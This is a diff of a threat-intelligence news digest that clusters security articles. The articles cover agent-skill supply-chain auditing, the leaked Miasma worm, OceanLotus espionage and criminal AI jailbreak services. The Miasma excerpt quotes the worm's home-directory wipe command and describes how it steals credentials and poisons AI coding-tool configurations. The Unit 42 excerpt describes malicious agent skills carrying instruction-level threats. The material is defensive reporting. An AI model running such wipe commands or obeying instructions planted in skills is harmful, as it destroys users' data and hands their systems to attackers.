(LLM) agents in production should inventory the third-party skills installed and require a behavioral-integrity check before installation rather than after. Palo Alto Networks customers are better protected from this type of issue through the following products and services: Prisma AIRS The Unit 42 AI Security Assessment can help empower safe AI use and development. If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics LLM , AI Agents , Supply Chain Background Enterprises now deploy LLM agents to automate tasks across code generation, IT operations, customer support and internal workflows. These agents are extended with skills, the agent equivalent of an app: a small package that bundles executable code with a YAML manifest and a natural-language SKILL.md file telling the agent when and how to use it. Once installed, a skill runs inside the agent's privileged context. It can read environment variables, call external services, write files and execute shell commands on behalf of the organization. Public agent-skill registries now host tens of thousands of these packages. Anyone can publish. Anyone can install. The platforms that came before, package managers, mobile app stores and browser extension marketplaces, all eventually grew automated audit ecosystems after attackers turned the openness against users. The agent-skill ecosystem has not. The audit problem in this ecosystem differs from anything earlier platforms faced. A skill's behavior splits across three modalities: Metadata Executable code Natural-language instructions The metadata declares what the skill is supposed to do. The code and instructions together drive what it does. No existing scanner reads all three, and the registry has no automated way to verify that the two sides match. BIV is the audit primitive that compares them. The Method: Declared Vs. Actual Behavior BIV asks one question of every skill: Does what it says match what it does? To answer that question consistently across tens of thousands of skills, BIV needed a shared vocabulary. We used a fixed taxonomy of 29 capabilities organized into seven families: Network File system Process execution Environment Encoding Credentials Instruction-level threats Two parallel tracks populate the taxonomy: The declared track reads the metadata. Deterministic parsers handle structural fields l
-```
-
-#### Corroborating sources (1)
-
-- **Unit 42** (threat_research_primary)
-  - Title: Trust No Skill: Integrity Verification for AI Agent Supply Chains
-  - Published: 2026-06-11T10:00:24+00:00
-  - Link: https://unit42.paloaltonetworks.com/ai-agent-supply-chain-risks/
-  - Summary: Protect enterprise AI agents from supply chain risks by auditing third-party skills for hidden vulnerabilities and multi-stage attack chains. The post Trust No Skill: Integrity Verification for AI Agent Supply Chains appeared first on Unit 42 .
 
 ### Cluster a7427d9735 — score 18
 
@@ -1877,7 +1837,73 @@ Infosecurity Magazine Home » News » Check Point Warns Critical Auth Bypass Bug
   - Link: https://www.infosecurity-magazine.com/news/check-point-critical-auth-bypass/
   - Summary: Check Point says a critical vulnerability in its Remote Access VPN and Mobile Access solutions has been exploited by Qilin
 
-### Cluster 642ef55777 — score 15
+### Cluster 4c68c71cf4 — score 15
+
+- Title: The ‘Miasma’ worm source code briefly leaked on GitHub
+- Source: BleepingComputer (cyber_news_breach_reporting)
+- Published: 2026-06-10T20:27:08+00:00
+- Link: https://www.bleepingcomputer.com/news/security/the-miasma-worm-source-code-briefly-leaked-on-github/
+- Fetch status: ok
+- Member count: 10
+- Corroborating source count: 5
+- Strong signals: GitHub
+
+#### Cluster taxonomy (union across members)
+- threat_categories: supply_chain, zero_day
+- affected_products: GitHub, Microsoft Defender, npm
+- tools_used: Azure, Kubernetes, PyPI, npm
+- urgency_signals: poc_available, zero_day
+- content_type: incident_report, intel_roundup, news_report, vendor_announcement
+- confidence_tier: tier_2_operator, tier_3_analysis, tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: supply_chain
+- affected_products: GitHub
+- tools_used: npm, PyPI, Kubernetes
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+The Miasma credential-stealing attack framework, which has recently targeted open-source ecosystems through supply-chain attacks, was briefly open-sourced on GitHub. [...]
+```
+
+#### Full body
+
+```
+The ‘Miasma’ worm source code briefly leaked on GitHub By Bill Toulas June 10, 2026 04:27 PM 0 The Miasma credential-stealing attack framework, which has recently targeted open-source ecosystems through supply-chain attacks, was briefly open-sourced on GitHub. Miasma appears to be an evolution of the earlier Shai-Hulud worm, which was previously leaked on GitHub and shares much of the same features, techniques, and even code. The malware infects a developer machine, steals the build environment and cloud credentials, and then uses those to compromise legitimate repositories and packages, publishing trojanized versions to infect downstream developers and repeat the cycle. This autonomous, worm-like self-propagation mechanism can quickly expand its reach, potentially turning a single breach into a widespread supply chain attack. The malware has previously been linked to high-profile attacks against Red Hat npm packages and, more recently, 73 Microsoft repositories on GitHub . Researchers at SafeDep reported yesterday that the Miasma source code was leaked on GitHub via numerous compromised developer accounts. In each of those accounts, the threat actors leaked the source code in a repo named "Miasma-Open-Source-Release." This indicates that the threat actors deliberately released the source code, rather than it being an accidental leak, similar to how the Shai-Hulud code was published earlier. The published source code files Source: SafeDep Analysis of the code showed that the toolkit requires no command-and-control (C2) infrastructure to operate, as it uses GitHub for that purpose. The framework harvests credentials from cloud providers, CI/CD systems, password managers, Kubernetes, and secret stores, and abuses them to compromise npm, PyPI, and RubyGems packages, as well as GitHub repositories, Actions workflows, and JFrog Artifactory instances. It can also move laterally through SSH and AWS Systems Manager (SSM), and poison configurations of AI coding tools such as Claude, Gemini, Cursor, Copilot, Kiro, and Cline. Architecture diagram Source: SafeDep One interesting feature revealed in the leaked Miasma source code is a "dead-man switch" that is installed when the malware uses a victim's stolen GitHub token as an exfiltration channel. The component monitors the token's validity every minute and, if it's revoked, executes a destructive command ( rm -rf ~/; rm -rf ~/Documents ), recursively deleting files and directories in the user's home and Documents folders. The monitor runs as a systemd user service on Linux or a LaunchAgent on macOS, and remains active for up to 72 hours. Another interesting aspect revealed is a five-stage build pipeline that generates unique payloads for each build. SafeDep reports that the process combines per-file AES-256-GCM encryption of embedded assets, randomized string obfuscation, source transformations, JavaScript obfuscation, and a self-extracting loader that wraps the final payload in three layers of encryption. Random keys and a randomized outer encoding layer ensure that each generated sample differs from previous builds, making signature-based detection and static analysis harder. The leak of Shai Hulud led to the release of more advanced variants, such as Miasma, and to increased attack rates . Similarly, the leak of Miasma's source code is expected to have a similar effect as threat actors adopt the code and further adjust it. This could have significant consequences for the security of the open-source ecosystem, as supply-chain attacks continue to target it at an unprecedented pace. Software developers are advised to pin project dependencies, introduce multi-day delays before adopting newly released package updates, and validate new builds in isolated test environments. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests you
+```
+
+#### Corroborating sources (5)
+
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: The ‘Miasma’ worm source code briefly leaked on GitHub
+  - Published: 2026-06-10T20:27:08+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/the-miasma-worm-source-code-briefly-leaked-on-github/
+  - Summary: The Miasma credential-stealing attack framework, which has recently targeted open-source ecosystems through supply-chain attacks, was briefly open-sourced on GitHub. [...]
+- **Risky Business News** (practitioner_analysis)
+  - Title: Sponsored: Understanding CI/CD attack paths
+  - Published: 2026-06-12T04:28:07+00:00
+  - Link: https://risky.biz/RBNEWSSI131/
+  - Summary: In this sponsored episode, James Wilson chats with SpecterOps CTO Jared Atkinson about the central role that GitHub has played in recent supply chain compromises. GitHub is where code gets built, tested, and shipped to devices, cloud, and on-prem environments. Understanding the paths an attacker can use to get into GitHub, and where they can pivot to from there, is essential to securing your GitHub repos and CI/CD pipelines.
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: ⚡ Weekly Recap: Instagram Account Hacks, Android Zero-Day, GitHub Worm and More
+  - Published: 2026-06-08T13:18:57+00:00
+  - Link: https://thehackernews.com/2026/06/weekly-recap-instagram-account-hacks.html
+  - Summary: Monday again. The weekend was meant to be quiet. It wasn't. Last week had poisoned packages, a broken AI helper, and a worm tearing through repos. The ugly part: basic tricks still worked. A chatbot got fooled. A bot token got leaked inside the malware. The same old mistakes showed up again. And while everyone chased the loud stuff, quieter attackers sat in inboxes for months, reading mail and
+- **Dark Reading** (cyber_news_breach_reporting)
+  - Title: Miasma Supply Chain Worm Burrows Into 73 Microsoft Repositories
+  - Published: 2026-06-09T19:33:45+00:00
+  - Link: https://www.darkreading.com/application-security/miasma-supply-chain-worm-73-microsoft-repositories
+  - Summary: The attacks stemmed from a GitHub account that was also compromised in a previous Miasma attack on Microsoft last month.
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - Title: Mini Shai-Hulud: Where SLSA’s Boundaries Fall
+  - Published: 2026-06-10T18:49:33+00:00
+  - Link: https://openssf.org/blog/2026/06/10/mini-shai-hulud-where-slsas-boundaries-fall/
+  - Summary: The “Mini Shai-Hulud” attack chained a GitHub Actions workflow misconfiguration, cache poisoning, and OIDC token extraction to publish malicious packages through legitimate CI/CD pipelines.
+
+### Cluster 642ef55777 — score 14
 
 - Title: 16 Best Open Source Application Security Tools 2026
 - Source: Orca Security Research (cloud_identity_infrastructure)
@@ -1922,7 +1948,7 @@ Table of contents What are application security tools, and why are they importan
   - Link: https://orca.security/resources/blog/open-source-application-security-tools/
   - Summary: Most application breaches do not begin with a zero-day exploit. They start with an exposed secret, a vulnerable dependency, or insecure code that reached production unnoticed. Open source application security tools help security teams identify these issues before attackers do. The tools covered in this article are organized by the specific layer they address, not […]
 
-### Cluster e86079a230 — score 15
+### Cluster e86079a230 — score 14
 
 - Title: Hackers Exploit Langflow Vulnerability for Remote Code Execution
 - Source: SecurityWeek (cyber_news_breach_reporting)
@@ -2013,103 +2039,6 @@ Risky Bulletin Podcast June 08, 2026 Risky Bulletin: RubyGems adds dependency co
   - Published: 2026-06-08T01:56:32+00:00
   - Link: https://risky.biz/RBNEWS574/
   - Summary: RubyGems adds dependency-cooldowns to counter supply chain attacks, AT&T and IBM are accused of hiding foreign hacks, Cisco warns of a new SD-WAN zero-day, and Google layoffs hit security teams.
-
-### Cluster 4c68c71cf4 — score 13
-
-- Title: The ‘Miasma’ worm source code briefly leaked on GitHub
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-06-10T20:27:08+00:00
-- Link: https://www.bleepingcomputer.com/news/security/the-miasma-worm-source-code-briefly-leaked-on-github/
-- Fetch status: fetch_failed:ReadTimeout
-- Member count: 9
-- Corroborating source count: 4
-- Strong signals: GitHub
-
-#### Cluster taxonomy (union across members)
-- threat_categories: supply_chain, zero_day
-- affected_products: GitHub, Microsoft Defender, npm
-- tools_used: Azure
-- urgency_signals: poc_available, zero_day
-- content_type: incident_report, intel_roundup, news_report, vendor_announcement
-- confidence_tier: tier_2_operator, tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: supply_chain
-- affected_products: GitHub
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-The Miasma credential-stealing attack framework, which has recently targeted open-source ecosystems through supply-chain attacks, was briefly open-sourced on GitHub. [...]
-```
-
-#### Corroborating sources (4)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: The ‘Miasma’ worm source code briefly leaked on GitHub
-  - Published: 2026-06-10T20:27:08+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/the-miasma-worm-source-code-briefly-leaked-on-github/
-  - Summary: The Miasma credential-stealing attack framework, which has recently targeted open-source ecosystems through supply-chain attacks, was briefly open-sourced on GitHub. [...]
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: ⚡ Weekly Recap: Instagram Account Hacks, Android Zero-Day, GitHub Worm and More
-  - Published: 2026-06-08T13:18:57+00:00
-  - Link: https://thehackernews.com/2026/06/weekly-recap-instagram-account-hacks.html
-  - Summary: Monday again. The weekend was meant to be quiet. It wasn't. Last week had poisoned packages, a broken AI helper, and a worm tearing through repos. The ugly part: basic tricks still worked. A chatbot got fooled. A bot token got leaked inside the malware. The same old mistakes showed up again. And while everyone chased the loud stuff, quieter attackers sat in inboxes for months, reading mail and
-- **Dark Reading** (cyber_news_breach_reporting)
-  - Title: Miasma Supply Chain Worm Burrows Into 73 Microsoft Repositories
-  - Published: 2026-06-09T19:33:45+00:00
-  - Link: https://www.darkreading.com/application-security/miasma-supply-chain-worm-73-microsoft-repositories
-  - Summary: The attacks stemmed from a GitHub account that was also compromised in a previous Miasma attack on Microsoft last month.
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - Title: Mini Shai-Hulud: Where SLSA’s Boundaries Fall
-  - Published: 2026-06-10T18:49:33+00:00
-  - Link: https://openssf.org/blog/2026/06/10/mini-shai-hulud-where-slsas-boundaries-fall/
-  - Summary: The “Mini Shai-Hulud” attack chained a GitHub Actions workflow misconfiguration, cache poisoning, and OIDC token extraction to publish malicious packages through legitimate CI/CD pipelines.
-
-### Cluster 8215bd2034 — score 12
-
-- Title: Criminal AI-as-a-Service in 2026: How the Underground Market Is Operationalizing Cybercrime
-- Source: Rapid7 (offensive_vulnerability_research)
-- Published: 2026-06-11T13:00:00+00:00
-- Link: https://www.rapid7.com/blog/post/tr-criminal-ai-underground-market-operationalizing-cybercrime-2026
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: phishing_social_eng
-- affected_industries: critical_infrastructure
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Primary article taxonomy
-- threat_categories: phishing_social_eng
-- affected_industries: critical_infrastructure
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-Introduction The underground market for criminally oriented generative AI has moved beyond the early hype surrounding 'malicious chatbots.' The gradual integration of AI as a productivity layer within cybercrime operations has become the dominant story, indicating that while the potential for fully autonomous AI hacking systems is possible, attackers are not embracing them as expected. Instead, threat actors are increasingly using AI to accelerate routine, but operationally significant, tasks to scale their operations. Drafting phishing lures, profiling targets, debugging code, generating forged documents, modifying malware, translating victim communications, and processing stolen data at scale were once time-consuming activities that AI has made significantly easier. AI does not replace cybercriminals; it lowers friction, increases speed, and expands the range of actors able to perform tasks that previously required more time, skill, or external support. AI is being absorbed into crim
-```
-
-#### Full body
-
-```
-Back to Blog Threat Research Criminal AI-as-a-Service in 2026: How the Underground Market Is Operationalizing Cybercrime Jeremy Makowski Jun 11, 2026 | Last updated on Jun 11, 2026 | 15 min read DISCOVER RAPID7 MDR Introduction The underground market for criminally oriented generative AI has moved beyond the early hype surrounding 'malicious chatbots.' The gradual integration of AI as a productivity layer within cybercrime operations has become the dominant story, indicating that while the potential for fully autonomous AI hacking systems is possible, attackers are not embracing them as expected. Instead, threat actors are increasingly using AI to accelerate routine, but operationally significant, tasks to scale their operations. Drafting phishing lures, profiling targets, debugging code, generating forged documents, modifying malware, translating victim communications, and processing stolen data at scale were once time-consuming activities that AI has made significantly easier. AI does not replace cybercriminals; it lowers friction, increases speed, and expands the range of actors able to perform tasks that previously required more time, skill, or external support. AI is being absorbed into criminal tradecraft, embedding itself in social engineering, fraud enablement, impersonation, identity abuse, and post-breach data exploitation. The market supporting this demand is not a single coherent product category, but a broader ecosystem of jailbreak wrappers, Telegram-based bots, prompt packs, open-weight model deployments, stolen AI accounts, and hijacked API keys. Their importance lies less in technical elegance than in usability. They provide criminals with accessible, repeatable, and commercially packaged ways to apply AI to operational problems. This ecosystem should not be mistaken for a stable or fully mature criminal market. Compared with more established sectors, criminal AI remains volatile, uneven, and heavily exposed to hype. Some services offer genuine operational utility while others are little more than repackaged public models marketed at inflated prices. Many are short-lived, deceptive, or opportunistic rebrands. Even so, the demand is real. The core shift is not the arrival of a single dominant criminal model, but the commercialization of access to AI-enabled criminal capability. The strategic significance of criminal AI lies in compressing time, lowering skill barriers, improving communication quality, and scaling existing criminal workflows. Criminal AI-as-a-Service The defining features of this market have little to do with any technical novelty, but rather the packaging and monetization of access. By early 2026, many underground services were marketed through familiar commercial mechanisms like subscriptions, private support channels, Telegram-based delivery, gated communities, and promises of uncensored output, privacy, or reduced logging. These are clear signs of SaaS-style commercialization, albeit far less mature or stable than its legitimate counterparts. The market should be best understood as “Criminal AI-as-a-Service.” Most offerings do not appear to rely on original foundational models built by threat actors. Instead, they typically depend on jailbreaks, wrappers around commercial services, fine-tuned open-weight models, repackaged interfaces, or modular combinations of existing capabilities. Pricing patterns suggest growing commercialization, but not a stable market structure. Entry-level access may be inexpensive, while premium services can be marketed at significantly higher rates with promises of priority support or additional functionality. These prices should be treated as indicative, not definitive (Figures 1 and 2). They are highly volatile and shaped by takedowns, fraud, rebranding, and shifting demand. At the lower end, free tools and stolen access to legitimate AI services often remain the default. In the middle of the market, recurring subscriptions are increasingly common. At the upper e
-```
-
-#### Corroborating sources (1)
-
-- **Rapid7** (offensive_vulnerability_research)
-  - Title: Criminal AI-as-a-Service in 2026: How the Underground Market Is Operationalizing Cybercrime
-  - Published: 2026-06-11T13:00:00+00:00
-  - Link: https://www.rapid7.com/blog/post/tr-criminal-ai-underground-market-operationalizing-cybercrime-2026
-  - Summary: Introduction The underground market for criminally oriented generative AI has moved beyond the early hype surrounding 'malicious chatbots.' The gradual integration of AI as a productivity layer within cybercrime operations has become the dominant story, indicating that while the potential for fully autonomous AI hacking systems is possible, attackers are not embracing them as expected. Instead, threat actors are increasingly using AI to accelerate routine, but operationally significant, tasks to scale their operations. Drafting phishing lures, profiling targets, debugging code, generating forged documents, modifying malware, translating victim communications, and processing stolen data at scale were once time-consuming activities that AI has made significantly easier. AI does not replace cybercriminals; it lowers friction, increases speed, and expands the range of actors able to perform tasks that previously required more time, skill, or external support. AI is being absorbed into crim
 
 ### Cluster 1714548889 — score 12
 
@@ -2241,6 +2170,51 @@ Vulnerabilities & Threats Сloud Security Identity & Access Management Security 
   - Link: https://www.darkreading.com/vulnerabilities-threats/exchange-flaw-attackers-spoof-email-address
   - Summary: “Ghost-Sender" is the result of a widespread misconfiguration, according to researchers, and evidence indicates it's being actively abused in the wild.
 
+### Cluster 749883f0dd — score 11
+
+- Title: OceanLotus: From external espionage to domestic targeting
+- Source: ESET WeLiveSecurity (threat_research_primary)
+- Published: 2026-06-11T08:45:00+00:00
+- Link: https://www.welivesecurity.com/en/eset-research/oceanlotus-external-espionage-domestic-targeting/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage, supply_chain, web_shell_backdoor
+- actor_attribution: APT32
+- affected_industries: government
+- content_type: threat_research
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: supply_chain, apt_espionage, web_shell_backdoor
+- actor_attribution: APT32
+- affected_industries: government
+- content_type: threat_research
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+A shift in operational pattern of the infamous Vietnam-aligned APT group
+```
+
+#### Full body
+
+```
+ESET Research OceanLotus: From external espionage to domestic targeting A shift in operational pattern of the infamous Vietnam-aligned APT group ESET Research 11 Jun 2026 • , 14 min. read Our tracking of OceanLotus activities from 2024–2026 reveals a shift in operational focus. During this period, the Vietnam-aligned OceanLotus adopted a more selective approach to external operations while placing increasing emphasis on domestic espionage. We identified two distinct campaigns involving the SPECTRALVIPER backdoor: a supply-chain attack targeting stock investors in Vietnam and a prolonged espionage operation against a Vietnamese infrastructure and transport construction company. Whether the shift represents a temporary adjustment or a long-term strategic change remains unclear; however, this 15-year-old APT group continues to demonstrate aggressive tactics and a level of craftiness in its tooling. Key points of this blogpost: From mid-2024 to February 2026, OceanLotus compromised the network of a Vietnamese infrastructure and transport construction corporation with its signature implant, SPECTRALVIPER. From October 2025 to March 2026, OceanLotus carried out a supply-chain attack leveraging FireAnt Metakit, a software platform widely used by stock investors in Vietnam. Despite the broad potential impact of such an attack, we observed only a few individuals who ultimately received SPECTRALVIPER, indicating selective targeting. An OPSEC mistake provides us with an internal view of SPECTRALVIPER’s architecture. OceanLotus profile OceanLotus, also known as APT32, is a cyberespionage group allegedly aligned with the interests of the Vietnamese government . According to our telemetry, activity attributed to this group dates back to 2012, and possibly earlier. OceanLotus mainly targets China and Southeast Asia (with a focus on Vietnam); it has been associated with a variety of operations, ranging from a massive digital profiling campaign to highly targeted attacks against Vietnamese human-rights activists. OceanLotus is known for continuously innovating and expanding its arsenals of Windows and Linux backdoors, often implementing unique network protocols or tailoring the data collection capabilities to specific operational objectives. Its well-known tools include Denis (aka SOUNDBITE), implementing DNS tunneling for C&C communications; PHOREAL, which leverages the ICMP protocol for C&C communications; WINDSHIELD, which features an interesting proxy bypass mechanism; and its latest backdoor, SPECTRALVIPER , which includes orchestration capabilities. OceanLotus: Exposure and realignment Between 2017 and 2020, OceanLotus attracted significant public attention following multiple reports detailing its cyberespionage activities. These included large-scale watering-hole attacks targeting Southeast Asia in 2017–2018, intrusions into corporations such as BMW and Hyundai in 2019, and the targeting of a Vietnamese dissident in Germany that same year. The group was also linked to operations against human rights defenders between 2019 and 2020, as well as espionage targeting the Wuhan municipal government in 2020. However, the group’s operations faced a setback in 2020 when Facebook publicly identified the company believed to be used as a front for OceanLotus. Following this exposure, public reporting on the group diminished significantly, and its activities received comparatively little attention for several years. OceanLotus resurfaced publicly in 2023 with a report from Elastic Security Labs that described an attack using a previously undocumented backdoor it named SPECTRALVIPER and that targeted Vietnamese businesses. Building on this, our research examines the group’s more recent activity, observed from mid-2024 through early 2026. During this period, we identified two distinct campaigns that both relied on SPECTRALVIPER as their primary backdoor but had very different target victim profiles. The first campaign involved the compromise of an inf
+```
+
+#### Corroborating sources (1)
+
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - Title: OceanLotus: From external espionage to domestic targeting
+  - Published: 2026-06-11T08:45:00+00:00
+  - Link: https://www.welivesecurity.com/en/eset-research/oceanlotus-external-espionage-domestic-targeting/
+  - Summary: A shift in operational pattern of the infamous Vietnam-aligned APT group
+
 ### Cluster 7a58aa9991 — score 11
 
 - Title: The 5-Step Context-Aware Cloud Vulnerability Prioritization Framework
@@ -2279,6 +2253,49 @@ Table of contents Why CVSS Alone Fails Cloud Vulnerability Prioritization How Do
   - Published: 2026-06-10T12:50:00+00:00
   - Link: https://orca.security/resources/blog/context-aware-cloud-vulnerability-prioritization-framework/
   - Summary: To prioritize cloud vulnerabilities effectively, start by mapping asset criticality, then assess real-world exploitability, anchor findings to known threat intelligence like CISA KEV, validate risk through runtime reachability, and cross-correlate attack paths across your entire cloud footprint. This five-step context-aware prioritization framework turns an unmanageable backlog into a defensible, ranked action plan. A high CVSS […]
+
+### Cluster 8215bd2034 — score 11
+
+- Title: Criminal AI-as-a-Service in 2026: How the Underground Market Is Operationalizing Cybercrime
+- Source: Rapid7 (offensive_vulnerability_research)
+- Published: 2026-06-11T13:00:00+00:00
+- Link: https://www.rapid7.com/blog/post/tr-criminal-ai-underground-market-operationalizing-cybercrime-2026
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: phishing_social_eng
+- affected_industries: critical_infrastructure
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- threat_categories: phishing_social_eng
+- affected_industries: critical_infrastructure
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+Introduction The underground market for criminally oriented generative AI has moved beyond the early hype surrounding 'malicious chatbots.' The gradual integration of AI as a productivity layer within cybercrime operations has become the dominant story, indicating that while the potential for fully autonomous AI hacking systems is possible, attackers are not embracing them as expected. Instead, threat actors are increasingly using AI to accelerate routine, but operationally significant, tasks to scale their operations. Drafting phishing lures, profiling targets, debugging code, generating forged documents, modifying malware, translating victim communications, and processing stolen data at scale were once time-consuming activities that AI has made significantly easier. AI does not replace cybercriminals; it lowers friction, increases speed, and expands the range of actors able to perform tasks that previously required more time, skill, or external support. AI is being absorbed into crim
+```
+
+#### Full body
+
+```
+Back to Blog Threat Research Criminal AI-as-a-Service in 2026: How the Underground Market Is Operationalizing Cybercrime Jeremy Makowski Jun 11, 2026 | Last updated on Jun 11, 2026 | 15 min read DISCOVER RAPID7 MDR Introduction The underground market for criminally oriented generative AI has moved beyond the early hype surrounding 'malicious chatbots.' The gradual integration of AI as a productivity layer within cybercrime operations has become the dominant story, indicating that while the potential for fully autonomous AI hacking systems is possible, attackers are not embracing them as expected. Instead, threat actors are increasingly using AI to accelerate routine, but operationally significant, tasks to scale their operations. Drafting phishing lures, profiling targets, debugging code, generating forged documents, modifying malware, translating victim communications, and processing stolen data at scale were once time-consuming activities that AI has made significantly easier. AI does not replace cybercriminals; it lowers friction, increases speed, and expands the range of actors able to perform tasks that previously required more time, skill, or external support. AI is being absorbed into criminal tradecraft, embedding itself in social engineering, fraud enablement, impersonation, identity abuse, and post-breach data exploitation. The market supporting this demand is not a single coherent product category, but a broader ecosystem of jailbreak wrappers, Telegram-based bots, prompt packs, open-weight model deployments, stolen AI accounts, and hijacked API keys. Their importance lies less in technical elegance than in usability. They provide criminals with accessible, repeatable, and commercially packaged ways to apply AI to operational problems. This ecosystem should not be mistaken for a stable or fully mature criminal market. Compared with more established sectors, criminal AI remains volatile, uneven, and heavily exposed to hype. Some services offer genuine operational utility while others are little more than repackaged public models marketed at inflated prices. Many are short-lived, deceptive, or opportunistic rebrands. Even so, the demand is real. The core shift is not the arrival of a single dominant criminal model, but the commercialization of access to AI-enabled criminal capability. The strategic significance of criminal AI lies in compressing time, lowering skill barriers, improving communication quality, and scaling existing criminal workflows. Criminal AI-as-a-Service The defining features of this market have little to do with any technical novelty, but rather the packaging and monetization of access. By early 2026, many underground services were marketed through familiar commercial mechanisms like subscriptions, private support channels, Telegram-based delivery, gated communities, and promises of uncensored output, privacy, or reduced logging. These are clear signs of SaaS-style commercialization, albeit far less mature or stable than its legitimate counterparts. The market should be best understood as “Criminal AI-as-a-Service.” Most offerings do not appear to rely on original foundational models built by threat actors. Instead, they typically depend on jailbreaks, wrappers around commercial services, fine-tuned open-weight models, repackaged interfaces, or modular combinations of existing capabilities. Pricing patterns suggest growing commercialization, but not a stable market structure. Entry-level access may be inexpensive, while premium services can be marketed at significantly higher rates with promises of priority support or additional functionality. These prices should be treated as indicative, not definitive (Figures 1 and 2). They are highly volatile and shaped by takedowns, fraud, rebranding, and shifting demand. At the lower end, free tools and stolen access to legitimate AI services often remain the default. In the middle of the market, recurring subscriptions are increasingly common. At the upper e
+```
+
+#### Corroborating sources (1)
+
+- **Rapid7** (offensive_vulnerability_research)
+  - Title: Criminal AI-as-a-Service in 2026: How the Underground Market Is Operationalizing Cybercrime
+  - Published: 2026-06-11T13:00:00+00:00
+  - Link: https://www.rapid7.com/blog/post/tr-criminal-ai-underground-market-operationalizing-cybercrime-2026
+  - Summary: Introduction The underground market for criminally oriented generative AI has moved beyond the early hype surrounding 'malicious chatbots.' The gradual integration of AI as a productivity layer within cybercrime operations has become the dominant story, indicating that while the potential for fully autonomous AI hacking systems is possible, attackers are not embracing them as expected. Instead, threat actors are increasingly using AI to accelerate routine, but operationally significant, tasks to scale their operations. Drafting phishing lures, profiling targets, debugging code, generating forged documents, modifying malware, translating victim communications, and processing stolen data at scale were once time-consuming activities that AI has made significantly easier. AI does not replace cybercriminals; it lowers friction, increases speed, and expands the range of actors able to perform tasks that previously required more time, skill, or external support. AI is being absorbed into crim
 
 ### Cluster b96df4915d — score 11
 
@@ -2322,51 +2339,6 @@ By Angelah Liu, OpenSSF Executive Summary The open source community recently gat
   - Published: 2026-06-05T19:12:30+00:00
   - Link: https://openssf.org/blog/2026/06/05/the-skyway-to-oss-security-openssf-community-day-north-america-2026-recap/
   - Summary: The open source community recently gathered in Minneapolis for Open Source Summit North America and OpenSSF Community Day North America 2026. Functioning as a collaborative “Skyway,” the Open Source Security Foundation (OpenSSF) successfully brought together diverse working groups, security researchers, and enterprise maintainers to unify tooling, address artificial intelligence security transitions, and fortify the global software supply chain.
-
-### Cluster 7c21419055 — score 11
-
-- Title: [tl;dr sec] #332 - I've Joined OpenAI, fwd:cloudsec, AWS Well Architected Supply Chain Security
-- Source: tl;dr sec (practitioner_analysis)
-- Published: 2026-06-11T14:30:00+00:00
-- Link: https://tldrsec.com/p/tldr-sec-332
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: supply_chain
-- affected_industries: critical_infrastructure
-- affected_products: GitHub, OpenAI/ChatGPT
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Primary article taxonomy
-- threat_categories: supply_chain
-- affected_industries: critical_infrastructure
-- affected_products: GitHub, OpenAI/ChatGPT
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Summary
-
-```
-Why I joined OpenAI to lead Cyber efforts, playlist of the latest cloud security talks, AWS' supply chain best practices
-```
-
-#### Full body
-
-```
-0 tl;dr sec Posts [tl;dr sec] #332 - I've Joined OpenAI, fwd:cloudsec, AWS Well Architected Supply Chain Security [tl;dr sec] #332 - I've Joined OpenAI, fwd:cloudsec, AWS Well Architected Supply Chain Security Why I joined OpenAI to lead Cyber efforts, playlist of the latest cloud security talks, AWS' supply chain best practices Clint Gibler June 11, 2026 Hey there, I hope you’ve been doing well! 🤔 New Job, Who Dis? TL;DR : I’ve joined OpenAI to lead their Cyber efforts. I’m joined by Mike Aiello , an awesome security executive and human. Mike was previously CTO at Secureworks, led product for Google Cloud Security from 0 → $B’s in revenue, and CISO at Goldman Sachs. I was going to write a post describing all the details about joining, my thought process, etc. but it turns out there’s a lot to do at OpenAI and I’ve gotten very busy 😅 The post is started but not finished, will share when I can. So here’s the short version. Why I was very happy at Semgrep and wasn’t looking for new opportunities, but when an OpenAI recruiter reached out, it seemed like a once in a lifetime company and opportunity that I couldn’t pass by. During the interview process, when I spoke with my potential colleagues, I was impressed by how they were incredibly smart and kind, and genuinely, earnestly, cared about making a positive impact on the world. Several people, without me bringing it up, expressed to me that as models get better, they feel a moral responsibility to do what they can to secure the world’s software. And now from the inside, I can see that the sentiment was genuine, and not a facade (you always wonder as an outsider). OpenAI has easily already spent millions securing open source and critical infrastructure that they haven’t yet claimed PR cred for doing. I’ve long talked about the power of secure by design and eliminating vulnerability classes . Being at OpenAI makes that feel tractable in a way it never has before. I’m optimistic we, the security community, can meaningfully raise the world’s security bar over the next few years. Seriously. Lastly, how I think about the decision is also well expressed by my friend Rami McCarthy , who, 